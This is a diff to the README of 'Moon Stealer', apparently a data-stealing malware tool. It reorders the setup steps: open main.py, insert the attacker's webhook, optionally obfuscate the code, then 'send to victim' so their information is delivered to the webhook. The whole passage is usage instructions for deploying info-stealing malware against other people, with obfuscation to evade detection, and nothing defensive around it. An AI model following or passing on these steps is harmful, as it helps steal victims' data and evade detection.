@@ -25,10 +25,12 @@ Moon Stealer
 
 3. Run `install_python.bat` if you don't have python installed
 
-4. Replace X with your webhook ``hook = "X"``
+4. Open ``main.py`` any text editor such as notepad.
 
-5. Obfuscate your code: https://pyobfuscate.com/ (Built in Obfuscator soon!
-6. 
+5. Replace X with your webhook ``hook = "X"``
+
+6. Obfuscate your code: https://pyobfuscate.com/ (Optional)
+
 7. Send to victim and when they run you will have their info in the webhook provided.
 
 <a id="features"></a>
